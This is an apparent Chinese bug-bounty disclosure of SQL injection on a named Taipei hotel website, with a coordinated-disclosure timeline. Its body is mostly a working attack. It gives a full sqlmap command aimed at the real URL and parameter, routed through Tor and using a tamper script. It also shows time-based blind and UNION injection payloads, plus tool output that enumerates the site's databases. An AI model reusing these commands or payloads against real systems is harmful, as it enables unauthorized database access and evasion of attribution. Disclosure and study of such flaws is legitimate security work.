wybug_detail:
漏洞详情 披露状态：   									2015-05-12：	细节已通知厂商并且等待厂商处理中									2015-05-16：	厂商已经确认，细节仅向厂商公开									2015-05-26：	细节向核心白帽子及相关领域专家公开									2015-06-05：	细节向普通白帽子公开									2015-06-15：	细节向实习白帽子公开									2015-06-30：	细节向公众公开  简要描述： 台湾某酒店SQL注入 (UNION query) 详细说明：  
$ ./sqlmap.py --tor --tor-type=SOCKS5 --random-agent --time-sec=15 --threads 2 --tamper unmagicquotes.py -u "http://www.regenttaipei.com/galleria_e/bday.php?gid=6" -p gid --dbms=mysql --dbsParameter: gid (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: gid=6' AND (SELECT * FROM (SELECT(SLEEP(15)))gUFp) AND 'CCaX'='CCaX    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: gid=-9517' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176627a71,0x6b766269666d504e7152,0x7171716271),NULL,NULL,NULL,NULL,NULL--
   漏洞证明：  
[16:05:10] [INFO] testing MySQL[16:05:14] [INFO] confirming MySQL[16:05:17] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.29, PHP 5.3.29back-end DBMS: MySQL >= 5.0.0[16:05:17] [INFO] fetching database names[16:05:19] [INFO] the SQL query used returns 3 entries[16:05:19] [INFO] starting 2 threads[16:05:21] [INFO] retrieved: information_schema[16:05:21] [INFO] retrieved: grandformosa_www[16:05:23] [INFO] retrieved: testavailable databases [3]:[*] grandformosa_www[*] information_schema[*] test
